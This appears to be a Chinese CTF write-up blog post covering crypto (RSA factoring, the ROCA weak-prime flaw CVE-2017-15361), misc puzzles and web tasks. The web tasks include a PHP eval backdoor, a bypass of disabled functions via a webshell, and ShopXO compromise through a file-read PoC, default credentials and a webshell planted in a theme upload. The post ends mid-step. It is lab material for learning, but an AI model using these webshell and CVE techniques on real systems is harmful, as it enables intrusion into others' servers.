&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;# n:0xb119849bc4523e49c6c038a509a74cda628d4ca0e4d0f28e677d57f3c3c7d0d876ef07d7581fe05a060546fedd7d061d3bc70d679b6c5dd9bc66c5bdad8f2ef898b1e785496c4989daf716a1c89d5c174da494eee7061bcb6d52cafa337fc2a7bba42c918bbd3104dff62ecc9d3704a455a6ce282de0d8129e26c840734ffd302bec5f0a66e0e6d00b5c50fa57c546cff9d7e6a978db77997082b4cb927df9847dfffef55138cb946c62c9f09b968033745b5b6868338c64819a8e92a827265f9abd409359a9471d8c3a2631b80e5b462ba42336717700998ff38536c2436e24ac19228cd2d7a909ead1a8494ff6c3a7151e888e115b68cc6a7a8c6cf8a6c005L
# e:65537
# enc:1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361
# p&amp;gt;&amp;gt;128&amp;lt;&amp;lt;128:0xe4e4b390c1d201dae2c00a4669c0865cc5767bc444f5d310f3cfc75872d96feb89e556972c99ae20753e3314240a52df5dccd076a47c6b5d11b531b92d901b2b512aeb0b263bbfd624fe3d52e5e238beeb581ebe012b2f176a4ffd1e0d2aa8c4d3a2656573b727d4d3136513a931428b00000000000000000000000000000000L
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;拿到题后就是上面的内容，看起来是 RSA，20 年的题了现在可以直接分解出来这个 n，直接常规接 RSA 即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from gmpy2 import *
import libnum

n = 22356763374676421464625378500213339933332772809897207920729779273423674391734609826525432054721219700275907299132471518921609327317193522567659631757746842030241874692914098354564311806192080734895649520789778880115460999713973202684541940857690744940359412410680906226760273075221532248260114209496048785258860756023841150910290983974843412361701517438220974722832625030127395031631696995777436058406987465592189873785392136925593708921923255186282515777996509326779993612528103615281644689464568237409082282767318227236298791238683706176542426759149262625349498709445342710799386836175120162674849965878446213480453
e = 65537
p = 139091353059018128421744751525080056530307965918298875691299992775484064426591581456998968315582349027071987206340653988925923465225471661893944397744293391269274124345189028818977002600599732469824164218366399726233373069742839737062004061244787413638290767590029376062508897417109117189614458570241407458359
q = 160734387026849747944319274262095716650717626398118440194223452208652532694713113062084219512359968722796763029072117463281356654614167941930993838521563406258263299846297499190884495560744873319814150988520868951045961906000066805136724505347218275230562125457122462589771119429631727404626489634314291445667
c = 1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361

N = (p-1)*(q-1)
d = invert(e,N)
m = pow(c,d,n)
print(libnum.n2s(int(m)))
//b&#39;flag&amp;#123;3d0914a1-1e97-4822-a745-c7e20c5179b9&amp;#125;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;backdoor&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#backdoor&#34;&gt;#&lt;/a&gt; Backdoor&lt;/h3&gt;
&lt;p&gt;这个题下载后给了三个文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041526867.png&#34; alt=&#34;image-20230404152640752&#34; /&gt;&lt;/p&gt;
&lt;p&gt;题目名叫后门，给了一个公式&lt;strong&gt;弱素数生成公式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041527502.png&#34; alt=&#34;image-20230404152753424&#34; /&gt;&lt;/p&gt;
&lt;p&gt;flag.enc&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;MDIxNDJhZjdjZTcwZmUwZGRhZTExNmJiN2U5NjI2MDI3NGVlOTI1MmE4Y2I1MjhlN2ZkZDI5ODA5YzJhNjAzMjcyN2MwNTUyNjEzM2FlNDYxMGVkOTQ0NTcyZmYxYWJmY2QwYjE3YWEyMmVmNDRhMg==
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个值解 base64 之后转 10 进制&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;59021026099361835300364130419492050160728561849475961557849334226894382166900594987062873888829896738392942368210302613981217873768
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;pub.pem&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;-----BEGIN PUBLIC KEY-----
MFMwDQYJKoZIhvcNAQEBBQADQgAwPwI4BXdHlrMB4cf0C0lFBWiLH94h9tX/zmNv
8WfYXjfXp7dJPjPBfUQXolyiSmcWMUzxhuFpltz8Z5sCAwEAAQ==
-----END PUBLIC KEY-----
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rhc2sucHk=&#34;&gt;task.py&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python
from Crypto.Util.number import *
from Crypto.PublicKey import RSA
import gmpy2, binascii
import base64
from FLAG import flag

def rsa_encrypt(message):
    with open(&#39;./pub.pem&#39; ,&#39;r&#39;) as f:
        key = RSA.import_key(f.read())
    e = key.e
    n = key.n
    c = pow(bytes_to_long(flag), e, n)
 
    ciphertext = binascii.hexlify(long_to_bytes(c))
    return ciphertext

if __name__ == &amp;quot;__main__&amp;quot;:
    text = base64.b64encode(rsa_encrypt(flag))
    with open(&#39;flag.enc&#39;,&#39;wb&#39;) as f:
        f.write(text)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;google 后发现是 CVE-2017-15361，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL2FzZWN1cml0eXNpdGUtd2hlbi1ib2ItbWV0LWFsaWNlL3NvLXdoYXQtd2FzLXRoZS1wcm9ibGVtLXdpdGgtdGhlLWVzdG9uaWFuLWlkLXN5c3RlbS1hbmQtdHBtcy0xZWYwMmE5YmRlN2Y=&#34;&gt;那么爱沙尼亚身份证系统和 TPM 的问题是什么？弱素数生成器（和 RSA！ | 作者：比尔・布坎南教授 OBE |A 安全网站：当鲍勃遇见爱丽丝 | 中等 (medium.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hc2VjdXJpdHlzaXRlLmNvbS9lbmNyeXB0aW9uL2NvcHBlcg==&#34;&gt;弱素数生成器 （RSALib） (asecuritysite.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;其中 &lt;em&gt;k&lt;/em&gt; 和 &lt;em&gt;a&lt;/em&gt; 是破解时的未知整数。&lt;em&gt;M&lt;/em&gt; 是前 n 个素数的乘法。&lt;/p&gt;
&lt;p&gt;n 的素数因子 p 是由这个公式得出的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from Crypto.Util import number

k=3
vals=39
a=12
M=1

primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997, 1009, 1013, 1019, 1021, 1031, 1033, 1039, 1049, 1051, 1061, 1063, 1069, 1087, 1091, 1093, 1097, 1103, 1109, 1117, 1123, 1129, 1151, 1153, 1163, 1171, 1181, 1187, 1193, 1201, 1213, 1217, 1223, 1229, 1231, 1237, 1249, 1259, 1277, 1279, 1283, 1289, 1291, 1297, 1301, 1303, 1307, 1319, 1321, 1327, 1361, 1367, 1373, 1381, 1399, 1409, 1423, 1427, 1429, 1433, 1439, 1447, 1451, 1453, 1459, 1471, 1481, 1483, 1487, 1489, 1493, 1499, 1511, 1523, 1531, 1543, 1549, 1553, 1559, 1567, 1571, 1579, 1583, 1597, 1601, 1607, 1609, 1613, 1619, 1621, 1627, 1637, 1657, 1663, 1667, 1669, 1693, 1697, 1699, 1709, 1721, 1723, 1733, 1741, 1747, 1753, 1759, 1777, 1783, 1787, 1789, 1801, 1811, 1823, 1831, 1847, 1861, 1867, 1871, 1873, 1877, 1879, 1889, 1901, 1907, 1913, 1931, 1933, 1949, 1951, 1973, 1979, 1987, 1993, 1997, 1999, 2003, 2011, 2017, 2027, 2029, 2039, 2053, 2063, 2069, 2081, 2083, 2087, 2089, 2099, 2111, 2113, 2129, 2131, 2137, 2141, 2143, 2153, 2161, 2179, 2203, 2207, 2213, 2221, 2237, 2239, 2243, 2251, 2267, 2269, 2273, 2281, 2287, 2293, 2297, 2309, 2311, 2333, 2339, 2341, 2347, 2351, 2357, 2371, 2377, 2381, 2383, 2389, 2393, 2399, 2411, 2417, 2423, 2437, 2441, 2447, 2459, 2467, 2473, 2477, 2503, 2521, 2531, 2539, 2543, 2549, 2551, 2557, 2579, 2591, 2593, 2609, 2617, 2621, 2633, 2647, 2657, 2659, 2663, 2671, 2677, 2683, 2687, 2689, 2693, 2699, 2707, 2711, 2713, 2719, 2729, 2731, 2741, 2749, 2753, 2767, 2777, 2789, 2791, 2797, 2801, 2803, 2819, 2833, 2837, 2843, 2851, 2857, 2861, 2879, 2887, 2897, 2903, 2909, 2917, 2927, 2939, 2953, 2957, 2963, 2969, 2971, 2999]

for x in range(0, vals):
    M=M*primes[x]

p=k*M+(65537**a %M)
print(&#39;k=&#39;,k)
print(&#39;a=&#39;,a)
print(&#39;Number of prime numbers used=&#39;,vals)
print(&#39;======&#39;)

print(&#39;M=&#39;,M)
print(&#39;\nPrime=&#39;,p)

isp = number.isPrime(p)
if (isp==1):
	print(&#39;Value is prime&#39;)
else:
	print(&#39;Value is not prime&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过 pub.pwm 来获取 e 和 n&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;with open(&#39;./pub.pem&#39; ,&#39;r&#39;) as f:
    key = RSA.import_key(f.read())
    e = key.e
    n = key.n
#e=65535
#n=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里的 n 是 134 位，预估 p 的位数不超过 134/2=67 位，M 代表前 x 项素数的乘积， x 的可选值有 5，16，39，71，80，126。在参数 k 与 a 取值不大的情况下，选取不同的 x 值，得到的 p 的位数不同。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041614575.png&#34; alt=&#34;image-20230404161441453&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里爆破一下求得 pq&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import gmpy2
M=962947420735983927056946215901134429196419130606213075415963491270
n=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739

for k in range(100):
	for a in range(100):
		p=k*M+(65537**a %M)
		if n%p==0:
			print(&#39;k=&#39;,k)
			print(&#39;a=&#39;,a)
			print(&#39;Prime=&#39;,p)
			isp = gmpy2.is_prime(p)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041616242.png&#34; alt=&#34;image-20230404161647184&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from gmpy2 import *
import libnum

n = 15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739
e = 65537
p = 3386619977051114637303328519173627165817832179845212640767197001941
q = 4582433561127855310805294456657993281782662645116543024537051682479
c = int(&amp;quot;02142af7ce70fe0ddae116bb7e96260274ee9252a8cb528e7fdd29809c2a6032727c05526133ae4610ed944572ff1abfcd0b17aa22ef44a2&amp;quot;,16)

N = (p-1)*(q-1)
d = invert(e,N)
m = pow(c,d,n)
# print(d)
print(libnum.n2s(int(m)))
#b&#39;flag&amp;#123;760958c9-cca9-458b-9cbe-ea07aa1668e4&amp;#125;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;misc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc&#34;&gt;#&lt;/a&gt; Misc&lt;/h2&gt;
&lt;h3 id=&#34;pokémon&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pokémon&#34;&gt;#&lt;/a&gt; Pokémon&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZW11bGF0b3Item9uZS5jb20vZG9jLnBocC9nYmEvdmJveWFkdmFuY2UuaHRtbA==&#34;&gt;Visual Boy Advance (emulator-zone.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;玩这个游戏，到 103 号路口就行，纯娱乐&lt;/p&gt;
&lt;h3 id=&#34;code-obfuscation&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#code-obfuscation&#34;&gt;#&lt;/a&gt; code obfuscation&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041752507.png&#34; alt=&#34;image-20230404175252420&#34; /&gt;&lt;/p&gt;
&lt;p&gt;将图片拉伸一下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041753123.png&#34; alt=&#34;image-20230404175317080&#34; /&gt;&lt;/p&gt;
&lt;p&gt;补一下这个图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041756324.png&#34; alt=&#34;image-20230404175641276&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041757333.png&#34; alt=&#34;image-20230404175700284&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里用 binwalk -e 分解后得到一个 rar&lt;/p&gt;
&lt;p&gt;将上面 gkctf 进行 base58 编码后可以打开压缩包&lt;/p&gt;
&lt;p&gt;打开后图片内容&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce
$Ai$An$At$Bk$Am$Aa$Ai$Bs$Bt$Cn
$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb
$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb
$Cp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;1 文件内容&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;eval(function(p,a,c,k,e,d)&amp;#123;e=function(c)&amp;#123;return(c&amp;lt;a?&amp;quot;&amp;quot;:e(parseInt(c/a)))+((c=c%a)&amp;gt;35?String.fromCharCode(c+29):c.toString(36))&amp;#125;;if(!&#39;&#39;.replace(/^/,String))&amp;#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&amp;#123;return d[e]&amp;#125;];e=function()&amp;#123;return&#39;\\w+&#39;&amp;#125;;c=1;&amp;#125;;while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p;&amp;#125;(&#39;15 n 14 a b c d e f g h i j k l m n o p q r s t u v w x y z 10 11 17=&amp;quot;n&amp;quot;12 15 n 14 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 10 11 17=&amp;quot;n&amp;quot;12 13=0 15 n 14 a b c d e f g h i j 10 11 16=&amp;quot;n&amp;quot;13=$((13+1))12 1g(&amp;quot;1f=\&#39; \&#39;;1e=\&#39;&amp;quot;\&#39;;16=\&#39;#\&#39;;1j=\&#39;(\&#39;;1i=\&#39;)\&#39;;1h=\&#39;.\&#39;;1a=\&#39;;\&#39;;19=\&#39;&amp;lt;\&#39;;18=\&#39;&amp;gt;\&#39;;1d=\&#39;1c\&#39;;1b=\&#39;&amp;#123;\&#39;;1k=\&#39;&amp;#125;\&#39;;1t=\&#39;0\&#39;;1u=\&#39;1\&#39;;1s=\&#39;2\&#39;;1r=\&#39;3\&#39;;1n=\&#39;4\&#39;;1m=\&#39;5\&#39;;1l=\&#39;6\&#39;;1q=\&#39;7\&#39;;1p=\&#39;8\&#39;;1o=\&#39;9\&#39;;&amp;quot;)&#39;,62,93,&#39;||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||do|eval|done|num|in|for|Bn|An|Ce|Cc|Cb|Cn|_|Cl|Bm|Bk|alert|By|Bt|Bs|Cp|Dg|Df|De|Dj|Di|Dh|Dd|Dc|Da|Db&#39;.split(&#39;|&#39;),0,&amp;#123;&amp;#125;))

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里用的是网上找到的脚本&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import string
s = &amp;quot;$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp&amp;quot;
ll = s.split(&#39;$&#39;)
list1 = [&#39;Bk&#39;,&#39;Bm&#39;,&#39;Bn&#39;,&#39;Bs&#39;,&#39;Bt&#39;,&#39;By&#39;,&#39;Cb&#39;,&#39;Cc&#39;,&#39;Ce&#39;,&#39;Cl&#39;,&#39;Cn&#39;,&#39;Cp&#39;,
&#39;Da&#39;,&#39;Db&#39;,&#39;Dc&#39;,&#39;Dd&#39;,&#39;De&#39;,&#39;Df&#39;,&#39;Dg&#39;,&#39;Dh&#39;,&#39;Di&#39;,&#39;Dj&#39;]
list2 = [&#39; &#39;,&#39;&amp;quot;&#39;,&#39;#&#39;,&#39;(&#39;,&#39;)&#39;,&#39;.&#39;,&#39;&#39;,&#39;&amp;lt;&#39;,&#39;&amp;gt;&#39;,&#39;_&#39;,&#39;&amp;#123;&#39;,&#39;&amp;#125;&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]
list3 = []
list4 = []
s = string.ascii_lowercase
for i in s:
	list3.append(&#39;A%s&#39;%i)
	list4.append(i)
#print(list3,&#39;\n&#39;,list4)

t = &#39;&#39;
for i in range(0,len(ll)):
	for j in range(0,len(list1)):
		if ll[i]==list1[j]:
			t += list2[j]
	for k in range(0,len(list3)):
		if ll[i]==list3[k]:
			t +=list4[k]
print(t)
#include &amp;lt;stdio.h&amp;gt;int main()&amp;#123;print(&amp;quot;w3lc0me_4o_9kct5&amp;quot;)return 0&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;harley-quinn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#harley-quinn&#34;&gt;#&lt;/a&gt; Harley Quinn&lt;/h3&gt;
&lt;p&gt;这题放了两个 hint，看起来当时开始的时候做出来的人还是不多的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304042357129.png&#34; alt=&#34;image-20230404235705038&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304042357970.png&#34; alt=&#34;image-20230404235716937&#34; /&gt;&lt;/p&gt;
&lt;p&gt;音频到结尾部分，有电话音的声音，用工具 dtmf2num 进行破解：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050010205.png&#34; alt=&#34;image-20230405001023160&#34; /&gt;&lt;/p&gt;
&lt;p&gt;#22283334447777338866#&lt;/p&gt;
&lt;p&gt;对应 9 建&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;ctfisfun
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050021579.png&#34; alt=&#34;image-20230405002121528&#34; /&gt;&lt;/p&gt;
&lt;p&gt;根据提示使用 FreeFileCamouflage 破解&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050021405.png&#34; alt=&#34;image-20230405002156367&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;sail-a-boat-down-the-river&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sail-a-boat-down-the-river&#34;&gt;#&lt;/a&gt; Sail a boat down the river&lt;/h3&gt;
&lt;p&gt;三解，三个 hint，当时的题还是很绕的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050024187.png&#34; alt=&#34;image-20230405002442142&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;Hint:
闪烁的光芒
是一行不是一列
加密方式很常见
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据提示在 &lt;code&gt;118帧-130帧&lt;/code&gt; 、 &lt;code&gt;200帧-208帧&lt;/code&gt; 、 &lt;code&gt;320帧-334帧&lt;/code&gt; 、 &lt;code&gt;410帧-418帧&lt;/code&gt; 刷卡器出现闪光，摩斯密码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-.-- .-- ---.. --.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;解出得 yw8g&lt;/p&gt;
&lt;p&gt;在 15 秒看到一张二维码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050032246.png&#34; alt=&#34;image-20230405003255656&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050035420.png&#34; alt=&#34;image-20230405003538176&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXR5Z3QwTm1fRzVmVGZWRmxneFZjclE=&#34;&gt;https://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;输入上面得到的密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050036502.png&#34; alt=&#34;image-20230405003637459&#34; /&gt;&lt;/p&gt;
&lt;p&gt;密钥解熟读，然后根据排序即可得到： &lt;code&gt;52693795149137&lt;/code&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1HRzBrYy02bzZocjY4Y2xnaGs0NmgudGY=&#34;&gt; 解密得到 GG0kc.tf&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050040420.png&#34; alt=&#34;image-20230405004030369&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;Overture&lt;/code&gt;  打开得到 flag&lt;/p&gt;
&lt;h2 id=&#34;web&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; Web&lt;/h2&gt;
&lt;h3 id=&#34;checkin&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#checkin&#34;&gt;#&lt;/a&gt; CheckIN&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;title&amp;gt;Check_In&amp;lt;/title&amp;gt;
&amp;lt;?php 
highlight_file(__FILE__);
class ClassName
&amp;#123;
        public $code = null;
        public $decode = null;
        function __construct()
        &amp;#123;
                $this-&amp;gt;code = @$this-&amp;gt;x()[&#39;Ginkgo&#39;];
                $this-&amp;gt;decode = @base64_decode( $this-&amp;gt;code );
                @Eval($this-&amp;gt;decode);
        &amp;#125;

        public function x()
        &amp;#123;
                return $_REQUEST;
        &amp;#125;
&amp;#125;
new ClassName();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里可以看到，源码很简单，接受参数，base64 解码后 eval 执行，先尝试 phpinfo ()&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050051333.png&#34; alt=&#34;image-20230405005151284&#34; /&gt;&lt;/p&gt;
&lt;p&gt;能够正常执行，但是看到在环境变量中过滤了很多函数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050052378.png&#34; alt=&#34;image-20230405005239337&#34; /&gt;&lt;/p&gt;
&lt;p&gt;没有过滤 eval 函数，尝试构造木马用蚁剑连接后，发现不能正常运行命令，使用插件绕过&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050058842.png&#34; alt=&#34;image-20230405005812789&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;老八小超市儿&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#老八小超市儿&#34;&gt;#&lt;/a&gt; 老八小超市儿&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051506808.png&#34; alt=&#34;image-20230405150623656&#34; /&gt;&lt;/p&gt;
&lt;p&gt;发现是 shopXO 电商系统，基于 thinkphp 开发的，去搜 CVE&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ4OTg1NzgwL2FydGljbGUvZGV0YWlscy8xMjIyMTgwOTE=&#34;&gt; (71 条消息) shopxo 文件读取（CNVD-2021-15822）_xzhome 的博客 - CSDN 博客&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这里直接用 poc 读取跟目录下面的 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051513091.png&#34; alt=&#34;image-20230405151307037&#34; /&gt;&lt;/p&gt;
&lt;p&gt;提示 flag 在 root 下面尝试读取发现 return 500 估计是权限问题，看来还得找别的 cve，看了下版本是 1.8&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051508840.png&#34; alt=&#34;image-20230405150840800&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMDk5NDAw&#34;&gt;渗透测试 | shopxo 后台全版本获取 shell 复现 - 腾讯云开发者社区 - 腾讯云 (tencent.com)&lt;/span&gt; 这里看到需要先登录，尝试发现没有改默认密码&lt;/p&gt;
&lt;p&gt;这里直接搜索主题&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051521200.png&#34; alt=&#34;image-20230405152129091&#34; /&gt;&lt;/p&gt;
&lt;p&gt;下载后添加一句话木马&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051534023.png&#34; alt=&#34;image-20230405153407978&#34; /&gt;&lt;/p&gt;
&lt;p&gt;再上传回去&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051535230.png&#34; alt=&#34;image-20230405153555190&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里直接添加&lt;/p&gt;
